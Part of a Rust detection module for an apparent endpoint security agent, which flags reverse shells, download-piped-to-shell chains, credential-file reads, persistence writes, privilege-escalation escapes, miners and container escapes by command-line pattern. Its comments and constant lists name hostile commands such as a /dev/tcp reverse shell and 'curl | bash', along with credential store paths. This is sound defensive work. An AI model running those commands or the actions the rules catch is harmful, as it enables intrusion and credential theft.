//! Behavioural, signature-free heuristics over process command lines.
//!
//! These are pure functions: they take the observed process fields and return
//! an optional [`DetectionData`].  Keeping them pure makes them trivially
//! unit-testable and lets the future Windows agent reuse the exact same logic
//! (only the field extraction in the collector differs per OS).
//!
//! Each heuristic is mapped to a MITRE ATT&CK technique so findings are
//! immediately actionable in the backend.

use crate::schema::{CorrelationKeys, DetectionData, DetectionMode, Severity};

use super::ioa::ProcContext;

/// Shells that, when seen spawning a network downloader, indicate a likely
/// download-and-execute chain.
const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "fish"];

/// Interpreters that, with an inline one-liner, are a common reverse-shell or
/// fileless-execution vector.
const INTERPRETERS: &[&str] = &["python", "python3", "perl", "ruby", "php", "lua"];

/// Whether a command line feeds downloaded content straight into a shell:
///
///   * a pipeline stage that is a downloader writing to stdout, directly
///     followed by a stage that is a shell (`curl -s x | sudo bash`,
///     `wget -qO- x | sh -s -- arg`);
///   * a command substitution of a downloader evaluated by the shell
///     (`eval "$(curl x)"`, `bash -c "$(wget -qO- x)"`, `source <(curl x)`).
///
/// Earlier versions matched substrings anywhere in the line, so a compound
/// command that merely mentioned `curl` and later ran `… | sha256sum` or
/// `eval` alerted (seen on a benign developer workstation recording). The
/// pipeline is now parsed: only *adjacent* stages count.
fn download_executes_in_shell(cmdline: &str) -> bool {
    // Flags are case-sensitive (`curl -o` vs `-O`); tool names are not.
    // Downloaders that write to stdout in a pipeline (nc/socat stream too).
    const STREAMING: &[&str] = &["curl", "wget", "nc", "ncat", "socat"];
    let first_word = |stage: &str| -> Option<String> {
        stage
            .split_whitespace()
            .find(|w| {
                !matches!(*w, "sudo" | "env" | "command" | "exec" | "nohup") && !w.contains('=')
            })
            .map(|w| {
                w.trim_matches(|c| c == '(' || c == '{' || c == '"' || c == '\'')
                    .rsplit('/')
                    .next()
                    .unwrap_or(w)
                    .to_ascii_lowercase()
            })
    };
    let writes_to_stdout = |tool: &str, stage: &str| -> bool {
        let words: Vec<&str> = stage.split_whitespace().collect();
        match tool {
            // curl writes to stdout unless -o/-O/--output/--remote-name.
            "curl" => !words.iter().enumerate().any(|(i, w)| {
                (*w == "-o" || *w == "--output") && words.get(i + 1).is_some_and(|f| *f != "-")
                    || *w == "-O"
                    || *w == "--remote-name"
                    || (w.starts_with("-o") && w.len() > 2 && !w.starts_with("-o-"))
                    || w.starts_with("--output=") && *w != "--output=-"
            }),
            // wget writes a file unless -O - / -O- / -qO- / --output-document=-.
            "wget" => words.iter().enumerate().any(|(i, w)| {
                let short = w.starts_with('-') && !w.starts_with("--");
                (short && w.ends_with("O-"))
                    || (short && w.ends_with('O') && words.get(i + 1) == Some(&"-"))
                    || *w == "--output-document=-"
                    || (*w == "--output-document" && words.get(i + 1) == Some(&"-"))
            }),
            _ => true,
        }
    };
    let is_shell = |w: &str| SHELLS.contains(&w);

    // The process's own `bash -c` / `/bin/sh -lc` prefix is the shell running
    // the script, not a pipeline stage.
    let mut script = cmdline.trim();
    loop {
        let mut words = script.splitn(3, char::is_whitespace);
        let (Some(first), Some(flag)) = (words.next(), words.next()) else {
            break;
        };
        let base = first.rsplit('/').next().unwrap_or(first);
        if is_shell(&base.to_ascii_lowercase()) && flag.starts_with('-') && flag.ends_with('c') {
            script = words.next().unwrap_or("").trim().trim_matches(['"', '\'']);
        } else {
            break;
        }
    }

    for command in script
        .split(['\n', ';'])
        .flat_map(|c| c.split("&&"))
        .flat_map(|c| c.split("||"))
    {
        let stages: Vec<&str> = command.split('|').collect();
        for pair in stages.windows(2) {
            let (Some(src), Some(dst)) = (first_word(pair[0]), first_word(pair[1])) else {
                continue;
            };
            if STREAMING.contains(&src.as_str())
                && writes_to_stdout(&src, pair[0])
                && is_shell(&dst)
            {
                return true;
            }
        }
        // Substitution evaluated by the shell.
        for open in ["$(", "`", "<("] {
            let mut rest = command;
            while let Some(i) = rest.find(open) {
                let inner = &rest[i + open.len()..];
                let before = rest[..i]
                    .trim_end()
                    .trim_end_matches(['"', '\''])
                    .trim_end()
                    .to_ascii_lowercase();
                if let Some(tool) = first_word(inner) {
                    if (tool == "curl" || tool == "wget")
                        // At the start of a command the substitution's
                        // output *is* the command that runs.
                        && (before.is_empty()
                            || before.ends_with("eval")
                            || before.ends_with("source")
                            || before.ends_with(" .")
                            || before == "."
                            || before.ends_with("-c"))
                    {
                        return true;
                    }
                }
                rest = inner;
            }
        }
    }
    false
}

/// Inspect a process execution for suspicious command-line behaviour.
///
/// `comm` is the short process name, `exe` the resolved binary path, `cmdline`
/// the full argument string (space-joined).  Returns at most one detection
/// (the highest-signal one) to avoid alert storms on a single exec.
#[cfg_attr(not(test), allow(dead_code))]
pub fn inspect_process(comm: &str, exe: &str, cmdline: &str) -> Option<DetectionData> {
    inspect_process_with(comm, exe, cmdline, None)
}

/// [`inspect_process`] with the acting process's tree context, which lets the
/// privilege-escalation heuristics require an actual elevation.
pub fn inspect_process_with(
    comm: &str,
    exe: &str,
    cmdline: &str,
    ctx: Option<&ProcContext>,
) -> Option<DetectionData> {
    let lower = cmdline.to_ascii_lowercase();
    let base = basename(comm);

    // 1. Reverse shell: a shell with stdin/stdout redirected to a TCP socket.
    //    Classic patterns: `bash -i >& /dev/tcp/host/port 0>&1`
    if lower.contains("/dev/tcp/") || lower.contains("/dev/udp/") {
        return Some(DetectionData {
            rule_id: "revshell.dev_tcp_redirect".into(),
            title: "Reverse shell via /dev/tcp redirection".into(),
            category: "reverse_shell".into(),
            mitre_tactic: Some("TA0011 Command and Control".into()),
            mitre_technique: Some("T1059.004".into()),
            confidence: 90,
            subject: exe.to_string(),
            detail: format!(
                "Process {base} references a raw network socket pseudo-device: {cmdline}"
            ),
            evidence: serde_json::json!({ "cmdline": cmdline }),
            ..Default::default()
        });
    }

    // 2. Interpreter one-liner opening a socket (python/perl/ruby reverse shell).
    if INTERPRETERS
        .iter()
        .any(|&i| base == i || base.starts_with(i))
    {
        let socket_hint = lower.contains("socket")
            && (lower.contains("connect")
                || lower.contains("sh")
                || lower.contains("subprocess")
                || lower.contains("os.dup"));
        let inline = lower.contains("-c ") || lower.contains("-e ");
        if socket_hint && inline {
            return Some(DetectionData {
                rule_id: "revshell.interpreter_socket".into(),
                title: "Interpreter inline socket execution".into(),
                category: "reverse_shell".into(),
                mitre_tactic: Some("TA0011 Command and Control".into()),
                mitre_technique: Some("T1059.006".into()),
                confidence: 80,
                subject: exe.to_string(),
                detail: format!(
                    "{base} executes an inline script opening a network socket: {cmdline}"
                ),
                evidence: serde_json::json!({ "cmdline": cmdline }),
                ..Default::default()
            });
        }
    }

    // 3. Shell invoking a downloader and piping straight into a shell
    //    (`curl http://x | bash`, `wget -O- … | sh`).
    if SHELLS.contains(&base) && download_executes_in_shell(cmdline) {
        return Some(DetectionData {
            rule_id: "lolbin.download_pipe_shell".into(),
            title: "Download piped directly into a shell".into(),
            category: "lolbin".into(),
            mitre_tactic: Some("TA0002 Execution".into()),
            mitre_technique: Some("T1059.004".into()),
            confidence: 75,
            subject: exe.to_string(),
            detail: format!("Shell {base} downloads and executes in one step: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
            ..Default::default()
        });
    }

    // 4. Fileless execution via memfd / /proc/self/fd.
    if lower.contains("memfd:") || lower.contains("/proc/self/fd/") {
        return Some(DetectionData {
            rule_id: "fileless.memfd_exec".into(),
            title: "Execution from in-memory file descriptor".into(),
            category: "fileless".into(),
            mitre_tactic: Some("TA0005 Defense Evasion".into()),
            mitre_technique: Some("T1620".into()),
            confidence: 70,
            subject: exe.to_string(),
            detail: format!("Process {base} executes from a memory-backed fd: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
            ..Default::default()
        });
    }

    // 5. Credential access: reading the shadow password file via a shell tool.
    if (lower.contains("/etc/shadow") || lower.contains("/etc/gshadow"))
        && (base == "cat"
            || base == "cp"
            || base == "less"
            || base == "head"
            || base == "tail"
            || base == "dd"
            || base == "xxd"
            || base == "strings")
    {
        return Some(DetectionData {
            rule_id: "creds.shadow_read".into(),
            title: "Shadow password file accessed by a shell tool".into(),
            category: "credential_access".into(),
            mitre_tactic: Some("TA0006 Credential Access".into()),
            mitre_technique: Some("T1003.008".into()),
            confidence: 65,
            subject: exe.to_string(),
            detail: format!("{base} reads the shadow file: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
            ..Default::default()
        });
    }

    // 6. Credential theft: access to cloud / SSH / browser credential stores.
    const CRED_STORES: &[(&str, &str)] = &[
        (".aws/credentials", "AWS credentials"),
        (".kube/config", "Kubernetes config"),
        (".docker/config.json", "Docker registry credentials"),
        (".gnupg/", "GnuPG keyring"),
        (".netrc", "netrc credentials"),
        (".git-credentials", "git credentials"),
    ];
    const READERS: &[&str] = &[
        "cat", "cp", "scp", "tar", "rsync", "less", "more", "head", "tail", "base64", "curl",
        "xxd", "strings", "nc", "ncat",
    ];
    if READERS.contains(&base) {
        if let Some(key) = private_key_arg(cmdline) {
            return Some(DetectionData {
                rule_id: "creds.private_key_read".into(),
                title: "SSH private key read by a shell tool".into(),
                category: "credential_access".into(),
                mitre_tactic: Some("TA0006 Credential Access".into()),
                mitre_technique: Some("T1552.004".into()),
                confidence: 75,
                subject: key.clone(),
                detail: format!("{base} reads private key {key}: {cmdline}"),
                evidence: serde_json::json!({ "cmdline": cmdline, "path": key }),
                correlation: Some(CorrelationKeys {
                    file_path: Some(key),
                    ..Default::default()
                }),
                ..Default::default()
            });
        }
        if let Some((_, label)) = CRED_STORES.iter().find(|(p, _)| lower.contains(p)) {
            return Some(DetectionData {
                rule_id: "creds.secret_store_access".into(),
                title: format!("Access to {label}"),
                category: "credential_access".into(),
                mitre_tactic: Some("TA0006 Credential Access".into()),
                mitre_technique: Some("T1552.001".into()),
                confidence: 60,
                subject: exe.to_string(),
                detail: format!("{base} touches {label}: {cmdline}"),
                evidence: serde_json::json!({ "cmdline": cmdline, "store": label }),
                ..Default::default()
            });
        }
    }

    // 7. Defense evasion: clearing system logs (alert) or shell history
    //    (signal: users clear their own history for benign reasons too).
    if lower.contains("/var/log/") && matches!(base, "rm" | "shred" | "truncate" | "unlink") {
        return Some(DetectionData {
            rule_id: "evasion.log_or_history_clear".into(),
            title: "System log tampering".into(),
            category: "defense_evasion".into(),
            mitre_tactic: Some("TA0005 Defense Evasion".into()),
            mitre_technique: Some("T1070.002".into()),
            confidence: 70,
            subject: exe.to_string(),
            detail: format!("{base} deletes or truncates system logs: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
            ..Default::default()
        });
    }
    let clears_history = has_word(&lower, "history") && lower.contains(" -c")
        || lower.contains("unset histfile")
        || lower.contains("histsize=0")
        || lower.contains(".bash_history")
            && (lower.contains("/dev/null")
                || matches!(base, "rm" | "shred" | "truncate")
                || lower.contains("> ~/.bash_history")
                || lower.contains(">~/.bash_history"));
    if clears_history {
        return Some(DetectionData {
            rule_id: "evasion.history_clear".into(),
            title: "Shell history cleared".into(),
            category: "defense_evasion".into(),
            mitre_tactic: Some("TA0005 Defense Evasion".into()),
            mitre_technique: Some("T1070.003".into()),
            confidence: 60,
            subject: exe.to_string(),
            detail: format!("{base} clears shell history: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
            ..Default::default()
        });
    }

    // 8. Persistence: a write whose *target* is an autostart location. The
    //    target is parsed from redirections and writer arguments; a path that
    //    merely appears somewhere in the command line is not a write.
    for target in write_targets(base, cmdline) {
        if let Some(d) = persistence_for_target(&target, base, cmdline) {
            return Some(d);
        }
    }

    // 9. Privilege escalation: known GTFOBins-style abuse of trusted binaries.
    //    e.g. `find . -exec /bin/sh \;`, `nmap --interactive`, `vim -c :!sh`.
    let pe = match base {
        "find"
            if lower.contains("-exec")
                && (lower.contains("/sh")
                    || lower.contains("/bash")
                    || lower.contains("bash")
                    || lower.contains(" sh ")) =>
        {
            Some("find -exec shell")
        }
        "nmap" if lower.contains("--interactive") => Some("nmap --interactive escape"),
        "vim" | "vi" | "view" | "nvim"
            if lower.contains(":!")
                || lower.contains(":sh")
                || lower.contains(":shell")
                || lower.contains("!/bin/sh")
                || lower.contains("!/bin/bash") =>
        {
            Some("editor shell escape")
        }
        "awk" | "gawk" if lower.contains("system(") || lower.contains("\"/bin/sh\"") => {
            Some("awk system() escape")
        }
        "tar" if lower.contains("--checkpoint-action") => Some("tar checkpoint-action escape"),
        "env" if lower.contains("/bin/sh") || lower.contains("/bin/bash") => {
            Some("env shell spawn")
        }
        _ => None,
    };
    // A shell escape is only privilege escalation when the binary runs with
    // more privilege than its user: as root, or below sudo/doas. Without tree
    // context (log-sourced sudo commands) the elevation is implied.
    let elevated = ctx.is_none_or(|c| {
        c.uid == 0
            || c.ancestor_comms
                .iter()
                .take(3)
                .any(|a| matches!(a.as_str(), "sudo" | "doas" | "pkexec" | "su"))
    });
    if let (Some(technique), true) = (pe, elevated) {
        return Some(DetectionData {
            rule_id: "privesc.gtfobin".into(),
            title: "Trusted binary abused to spawn a shell".into(),
            category: "privilege_escalation".into(),
            mitre_tactic: Some("TA0004 Privilege Escalation".into()),
            mitre_technique: Some("T1548".into()),
            confidence: 70,
            subject: exe.to_string(),
            detail: format!("{base}: {technique} — {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline, "technique": technique }),
            ..Default::default()
        });
    }

    None
}

/// Alert when a process was launched with LD_PRELOAD set (shared-library injection).
pub fn inspect_ld_preload(comm: &str, exe: &str, ld_preload: &str) -> Option<DetectionData> {
    // Distro-shipped preloads (jemalloc, libfaketime, …) are routine; only a
    // library outside the standard roots is an injection signal.
    const TRUSTED: &[&str] = &[
        "/lib/",
        "/lib64/",
        "/usr/lib/",
        "/usr/lib64/",
        "/usr/local/lib/",
    ];
    let value = ld_preload.trim_start_matches("LD_PRELOAD=");
    let trusted = !value.is_empty()
        && value
            .split([':', ' '])
            .filter(|p| !p.is_empty())
            .all(|p| TRUSTED.iter().any(|t| p.starts_with(t)) && !p.contains(".."));
    Some(DetectionData {
        confidence: if trusted { 40 } else { 85 },
        rule_id: "injection.ld_preload".into(),
        title: "LD_PRELOAD set — shared library injection".into(),
        category: "defense_evasion".into(),
        mitre_tactic: Some("TA0005 Defense Evasion".into()),
        mitre_technique: Some("T1574.006".into()),
        subject: exe.to_string(),
        detail: format!("{comm} launched with {ld_preload}"),
        evidence: serde_json::json!({ "ld_preload": ld_preload, "comm": comm }),
        ..Default::default()
    })
}

// ── Write-target parsing (persistence) ───────────────────────────────────────

/// Commands whose arguments name the file they write.
const ARG_WRITERS: &[&str] = &["tee", "cp", "mv", "install", "ln", "rsync", "dd", "sed"];

/// Files a command line writes: redirection targets anywhere in it (so
/// `bash -c "echo x >> /etc/cron.d/x"` counts), plus the destination argument
/// of writer tools (`tee`, `cp`, `mv`, `install`, `dd of=`, `sed -i`), plus the
/// crontab spool for `crontab <file>`.
pub fn write_targets(base: &str, cmdline: &str) -> Vec<String> {
    let mut out = Vec::new();
    let chars: Vec<char> = cmdline.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '>' {
            let mut j = i + 1;
            while j < chars.len() && (chars[j] == '>' || chars[j] == '|') {
                j += 1;
            }
            // `>&2`, `2>&1`: a descriptor, not a file.
            if j < chars.len() && chars[j] == '&' {
                i = j + 1;
                continue;
            }
            while j < chars.len() && chars[j] == ' ' {
                j += 1;
            }
            let start = j;
            while j < chars.len() && !matches!(chars[j], ' ' | ';' | '|' | '&' | ')' | '(') {
                j += 1;
            }
            let tok: String = chars[start..j].iter().collect();
            let tok = tok.trim_matches(|c| c == '"' || c == '\'').to_string();
            if !tok.is_empty() && tok != "/dev/null" {
                out.push(tok);
            }
            i = j;
            continue;
        }
        i += 1;
    }

    // Writer tools: walk each `|`/`;`/`&&` segment.
    for segment in cmdline.split(['|', ';', '&']) {
        let toks: Vec<&str> = segment.split_whitespace().collect();
        let Some(pos) = toks.iter().position(|t| ARG_WRITERS.contains(&basename(t))) else {
            continue;
        };
        let tool = basename(toks[pos]);
        let args: Vec<&str> = toks[pos + 1..]
            .iter()
            .copied()
            .take_while(|t| !t.starts_with('>'))
            .collect();
        let positional: Vec<&str> = args
            .iter()
            .copied()
            .filter(|a| !a.starts_with('-'))
            .collect();
        match tool {
            "tee" => out.extend(positional.iter().map(|a| unquote(a))),
            "dd" => out.extend(
                args.iter()
                    .filter_map(|a| a.strip_prefix("of="))
                    .map(unquote),
            ),
            "sed" if args.iter().any(|a| a.starts_with("-i")) => {
                if let Some(last) = positional.last() {
                    out.push(unquote(last));
                }
            }
            "sed" => {}
            _ => {
                if positional.len() >= 2 {
                    out.push(unquote(positional[positional.len() - 1]));
                }
            }
        }
    }
    if base == "crontab" {
        let lower = cmdline.to_ascii_lowercase();
        if !lower.contains(" -l") && !lower.contains(" -r") {
            out.push("/var/spool/cron/crontabs".into());
        }
    }
    out
}

fn unquote(s: &str) -> String {
    s.trim_matches(|c| c == '"' || c == '\'').to_string()
}

/// The persistence rule a written path falls under, if any. Shared by the
/// command-line heuristics and the file-event rules in [`super::files`].
pub fn persistence_rule_for_path(path: &str) -> Option<(&'static str, &'static str, &'static str)> {
    let p = path.to_ascii_lowercase();
    if p.contains("/etc/ld.so.preload") {
        return Some((
            "persistence.ld_preload",
            "T1574.006",
            "Write to /etc/ld.so.preload",
        ));
    }
    if p.contains("/.ssh/authorized_keys")
        || p.ends_with("authorized_keys")
        || p.contains("authorized_keys2")
    {
        return Some((
            "persistence.ssh_authorized_keys",
            "T1098.004",
            "SSH authorized_keys modified",
        ));
    }
    if p.starts_with("/etc/sudoers") {
        return Some((
            "privesc.sudoers_modify",
            "T1548.003",
            "sudoers policy modified",
        ));
    }
    if p.starts_with("/etc/cron")
        || p.starts_with("/var/spool/cron")
        || p.starts_with("/etc/anacrontab")
    {
        return Some(("persistence.cron_write", "T1053.003", "Cron job written"));
    }
    if p.starts_with("/etc/systemd/system/")
        || p.starts_with("/lib/systemd/system/")
        || p.starts_with("/usr/lib/systemd/system/")
        || p.contains("/.config/systemd/user/")
        || p.starts_with("/etc/systemd/user/")
    {
        if p.ends_with(".service")
            || p.ends_with(".timer")
            || p.ends_with(".socket")
            || p.ends_with(".path")
        {
            return Some((
                "persistence.systemd_unit",
                "T1543.002",
                "systemd unit written",
            ));
        }
        return None;
    }
    if p.starts_with("/etc/init.d/")
        || p.starts_with("/etc/rc.local")
        || p.starts_with("/etc/profile.d/")
        || p.starts_with("/etc/update-motd.d/")
        || p.starts_with("/etc/xdg/autostart/")
        || p.contains("/.config/autostart/")
    {
        return Some((
            "persistence.autostart_write",
            "T1037",
            "Autostart location written",
        ));
    }
    const RC_FILES: &[&str] = &[
        "/.bashrc",
        "/.bash_profile",
        "/.bash_login",
        "/.profile",
        "/.zshrc",
        "/.zprofile",
        "/.bash_logout",
    ];
    if RC_FILES.iter().any(|r| p.ends_with(r)) || p == "/etc/profile" || p == "/etc/bash.bashrc" {
        return Some((
            "persistence.rc_edit",
            "T1546.004",
            "Shell startup file modified",
        ));
    }
    None
}

fn persistence_for_target(target: &str, base: &str, cmdline: &str) -> Option<DetectionData> {
    let (rule_id, technique, title) = persistence_rule_for_path(target)?;
    let tactic = if rule_id.starts_with("privesc.") {
        "TA0004 Privilege Escalation"
    } else {
        "TA0003 Persistence"
    };
    // `crontab` is the sanctioned way to install a cron job; anything else
    // writing the cron spool is not.
    let base_severity = (rule_id == "persistence.cron_write").then(|| {
        if base == "crontab" {
            Severity::Medium
        } else {
            Severity::High
        }
    });
    Some(DetectionData {
        rule_id: rule_id.into(),
        title: title.into(),
        category: if tactic.starts_with("TA0004") {
            "privilege_escalation".into()
        } else {
            "persistence".into()
        },
        mitre_tactic: Some(tactic.into()),
        mitre_technique: Some(technique.into()),
        confidence: 70,
        subject: target.to_string(),
        detail: format!("{base} writes {target}: {cmdline}"),
        evidence: serde_json::json!({ "cmdline": cmdline, "path": target }),
        base_severity,
        correlation: Some(CorrelationKeys {
            file_path: Some(target.to_string()),
            ..Default::default()
        }),
        ..Default::default()
    })
}

/// First SSH private-key path argument (`~/.ssh/id_*`, not `*.pub`).
fn private_key_arg(cmdline: &str) -> Option<String> {
    cmdline.split_whitespace().map(unquote).find(|t| {
        let file = t.rsplit('/').next().unwrap_or(t);
        t.contains(".ssh/") && file.starts_with("id_") && !file.ends_with(".pub")
    })
}

fn has_word(haystack: &str, word: &str) -> bool {
    haystack
        .split(|c: char| !c.is_ascii_alphanumeric() && c != '_')
        .any(|w| w == word)
}

// ── Context-aware process rules ──────────────────────────────────────────────

const WEB_USERS: &[&str] = &["www-data", "apache", "nginx", "http", "wwwrun", "lighttpd"];
const TEMP_PREFIXES: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"];
const MINER_BINARIES: &[&str] = &[
    "xmrig",
    "xmr-stak",
    "minerd",
    "cpuminer",
    "ccminer",
    "nbminer",
    "t-rex",
    "ethminer",
    "lolminer",
    "phoenixminer",
    "kdevtmpfsi",
    "kinsing",
];
const MINER_MARKERS: &[&str] = &[
    "stratum+tcp://",
    "stratum+ssl://",
    "stratum2+tcp://",
    "--donate-level",
    "cryptonight",
    "--randomx",
    "-a rx/0",
    "--coin=monero",
    "pool.minexmr",
    "nanopool.org",
    "supportxmr",
];
const ARCHIVERS: &[&str] = &[
    "tar", "zip", "7z", "7za", "rar", "gzip", "xz", "bzip2", "zstd",
];
const ARCHIVE_EXT: &[&str] = &[
    ".tar", ".tgz", ".tar.gz", ".zip", ".7z", ".gz", ".xz", ".rar", ".bz2", ".zst",
];
const STAGING_SOURCES: &[&str] = &[
    "/.ssh",
    "/.aws",
    "/.gnupg",
    "/.kube",
    "/etc/",
    "/root",
    "/home/",
    "/var/lib/mysql",
    "/var/lib/postgresql",
    "/var/www",
    ".git-credentials",
];

/// Process rules that need the process tree (lineage, user, container) or may
/// fire alongside the single-verdict heuristics above. Each returned finding
/// is a distinct observation; the gate folds repeats.
pub fn inspect_process_context(
    comm: &str,
    exe: &str,
    cmdline: &str,
    ctx: Option<&ProcContext>,
) -> Vec<DetectionData> {
    let mut out = Vec::new();
    let lower = cmdline.to_ascii_lowercase();
    let base = basename(comm);
    let exe_base = basename(exe);
    let is_shell = SHELLS.contains(&base) || SHELLS.contains(&exe_base);
    let is_interp = INTERPRETERS
        .iter()
        .any(|i| base == *i || base.starts_with(i))
        && base != "php";

    // Web shell: a shell / interpreter spawned (closely) below a web server,
    // or running as a web-server account.
    if is_shell || is_interp {
        let web_parent = ctx.and_then(|c| {
            c.ancestor_comms
                .iter()
                .take(3)
                .find(|a| {
                    super::ioa::WEB_SERVERS
                        .iter()
                        .any(|w| a.as_str() == *w || a.starts_with(w))
                })
                .cloned()
        });
        let web_user = ctx.is_some_and(|c| WEB_USERS.contains(&c.username.as_str()));
        if web_parent.is_some() || web_user {
            let via = web_parent
                .clone()
                .unwrap_or_else(|| ctx.map(|c| c.username.clone()).unwrap_or_default());
            out.push(DetectionData {
                rule_id: "exec.webserver_shell".into(),
                title: "Shell spawned by a web server".into(),
                category: "initial_access".into(),
                mitre_tactic: Some("TA0001 Initial Access".into()),
                mitre_technique: Some("T1505.003".into()),
                confidence: 80,
                subject: exe.to_string(),
                detail: format!("{base} started under web server context {via}: {cmdline}"),
                evidence: serde_json::json!({ "cmdline": cmdline, "web_parent": web_parent, "web_user": web_user }),
                ..Default::default()
            });
        }
    }

    // base64-decoded payload piped into an interpreter.
    let decodes = lower.contains("base64 -d") || lower.contains("base64 --decode");
    if decodes {
        let after = lower.split("base64").skip(1).collect::<Vec<_>>().join(" ");
        let piped_to_interp = after.split('|').skip(1).any(|seg| {
            let first = seg.split_whitespace().next().map(basename).unwrap_or("");
            SHELLS.contains(&first) || INTERPRETERS.iter().any(|i| first.starts_with(i))
        });
        if piped_to_interp {
            out.push(DetectionData {
                rule_id: "exec.b64_decode_exec".into(),
                title: "Base64-decoded payload executed".into(),
                category: "execution".into(),
                mitre_tactic: Some("TA0005 Defense Evasion".into()),
                mitre_technique: Some("T1140".into()),
                confidence: 80,
                subject: exe.to_string(),
                detail: format!("Decoded payload piped into an interpreter: {cmdline}"),
                evidence: serde_json::json!({ "cmdline": cmdline }),
                ..Default::default()
            });
        }
    }

    // Cryptominer by binary name or pool/miner arguments.
    let miner_bin = MINER_BINARIES
        .iter()
        .find(|m| exe_base.contains(*m) || base.contains(*m));
    let miner_arg = MINER_MARKERS.iter().find(|m| lower.contains(*m));
    if miner_bin.is_some() || miner_arg.is_some() {
        let pool = cmdline
            .split_whitespace()
            .find(|t| t.to_ascii_lowercase().contains("stratum"))
            .map(String::from);
        let (pool_host, pool_port) = pool.as_deref().map(url_host_port).unwrap_or((None, None));
        out.push(DetectionData {
            rule_id: "impact.cryptominer".into(),
            title: "Cryptocurrency miner".into(),
            category: "impact".into(),
            mitre_tactic: Some("TA0040 Impact".into()),
            mitre_technique: Some("T1496".into()),
            confidence: if miner_bin.is_some() && miner_arg.is_some() {
                90
            } else {
                75
            },
            subject: exe.to_string(),
            detail: format!(
                "Mining indicators ({}): {cmdline}",
                miner_bin.or(miner_arg).unwrap()
            ),
            evidence: serde_json::json!({ "cmdline": cmdline, "pool": pool }),
            correlation: Some(remote_keys(pool_host, pool_port)),
            ..Default::default()
        });
    }

    // HTTP upload of a local file.
    if let Some(d) = http_upload(base, cmdline, &lower) {
        out.push(d);
    }

    // Archive of sensitive data staged in a temp directory.
    let toks: Vec<String> = cmdline.split_whitespace().map(unquote).collect();
    if ARCHIVERS.contains(&base)
        || toks
            .first()
            .is_some_and(|t| ARCHIVERS.contains(&basename(t)))
    {
        let staged = toks.iter().find(|t| {
            let l = t.to_ascii_lowercase();
            TEMP_PREFIXES.iter().any(|p| l.starts_with(p))
                && ARCHIVE_EXT.iter().any(|e| l.ends_with(e))
        });
        let source = toks.iter().find(|t| {
            !TEMP_PREFIXES.iter().any(|p| t.starts_with(p))
                && STAGING_SOURCES.iter().any(|s| t.contains(s))
                || t.contains("/.ssh")
        });
        if let (Some(archive), Some(source)) = (staged, source) {
            out.push(DetectionData {
                rule_id: "collection.archive_staging".into(),
                title: "Sensitive data archived into a temp directory".into(),
                category: "collection".into(),
                mitre_tactic: Some("TA0009 Collection".into()),
                mitre_technique: Some("T1560.001".into()),
                confidence: 65,
                subject: archive.clone(),
                detail: format!("{base} archives {source} into {archive}"),
                evidence: serde_json::json!({ "cmdline": cmdline, "path": archive, "source": source }),
                correlation: Some(CorrelationKeys {
                    file_path: Some(archive.clone()),
                    ..Default::default()
                }),
                ..Default::default()
            });
        }
    }

    // Container escape primitives.
    let in_container = ctx.is_some_and(|c| c.container_id.is_some());
    let host_escape =
        lower.contains("release_agent") || lower.contains("/proc/sys/kernel/core_pattern");
    let container_only = (base == "nsenter"
        && (lower.contains("-t 1")
            || lower.contains("--target 1")
            || lower.contains("--target=1")))
        || lower.contains("chroot /host")
        || lower.contains("docker.sock")
        || (base == "mount"
            && (lower.contains("/dev/sd")
                || lower.contains("/dev/nvme")
                || lower.contains("/dev/vd")));
    if host_escape || (container_only && in_container) {
        out.push(DetectionData {
            rule_id: "container.escape_indicators".into(),
            title: "Container escape attempt".into(),
            category: "privilege_escalation".into(),
            mitre_tactic: Some("TA0004 Privilege Escalation".into()),
            mitre_technique: Some("T1611".into()),
            confidence: 80,
            subject: exe.to_string(),
            detail: format!("Container breakout primitive: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline, "in_container": in_container }),
            ..Default::default()
        });
    }

    // Kernel module loaded from a user-writable location.
    if matches!(base, "insmod" | "modprobe") {
        let module = toks.iter().find(|t| {
            (TEMP_PREFIXES.iter().any(|p| t.starts_with(p)) || t.starts_with("/home/"))
                && (t.ends_with(".ko") || t.ends_with(".ko.xz") || t.ends_with(".ko.zst"))
        });
        if let Some(module) = module {
            out.push(DetectionData {
                rule_id: "defense.kmod_from_tmp".into(),
                title: "Kernel module loaded from a user-writable path".into(),
                category: "persistence".into(),
                mitre_tactic: Some("TA0003 Persistence".into()),
                mitre_technique: Some("T1547.006".into()),
                confidence: 90,
                subject: module.clone(),
                detail: format!("{base} loads {module}"),
                evidence: serde_json::json!({ "cmdline": cmdline, "path": module }),
                correlation: Some(CorrelationKeys {
                    file_path: Some(module.clone()),
                    ..Default::default()
                }),
                ..Default::default()
            });
        }
    }

    // Reading another process's memory (credential dumping from sshd, sudo…).
    let reads_proc_mem = toks.iter().any(|t| {
        t.strip_prefix("/proc/")
            .and_then(|r| r.split_once('/'))
            .is_some_and(|(pid, rest)| pid.chars().all(|c| c.is_ascii_digit()) && rest == "mem")
    }) || base == "gcore"
        || (base == "gdb" && (lower.contains(" -p ") || lower.contains("--pid")));
    if reads_proc_mem {
        out.push(DetectionData {
            rule_id: "creds.proc_mem_access".into(),
            title: "Process memory read".into(),
            category: "credential_access".into(),
            mitre_tactic: Some("TA0006 Credential Access".into()),
            mitre_technique: Some("T1003.007".into()),
            confidence: 70,
            subject: exe.to_string(),
            detail: format!("{base} reads another process's memory: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
            ..Default::default()
        });
    }

    // Execution from a temp directory: context only (installers do it too).
    if TEMP_PREFIXES.iter().any(|p| exe.starts_with(p)) {
        out.push(DetectionData {
            rule_id: "defense.tmp_exec".into(),
            title: "Binary executed from a temp directory".into(),
            category: "execution".into(),
            mitre_tactic: Some("TA0002 Execution".into()),
            mitre_technique: Some("T1204.002".into()),
            confidence: 50,
            subject: exe.to_string(),
            detail: format!("{exe} executed from a world-writable directory"),
            evidence: serde_json::json!({ "cmdline": cmdline, "path": exe }),
            correlation: Some(CorrelationKeys {
                file_path: Some(exe.to_string()),
                ..Default::default()
            }),
            ..Default::default()
        });
